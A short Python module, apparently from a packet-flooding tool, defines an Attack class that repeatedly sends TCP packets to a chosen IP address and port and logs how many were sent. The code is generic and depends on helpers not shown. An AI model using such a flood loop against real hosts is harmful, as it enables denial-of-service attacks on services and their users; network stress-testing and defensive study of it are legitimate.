from lib.util.debug import Debug
from lib.util.send_tcp import tcp_sender
class Attack:
	def __init__(self, ip, port, packets):
		self.ip = ip
		self.port = port
		self.packets = packets
	def attack(self):
		total = 0
		for x in range(0, int(self.packets)):
			tcp_sender(self.ip, self.port).send()
			total+=1
		Debug(f'[+] Sent {total} packets', verbose=True)


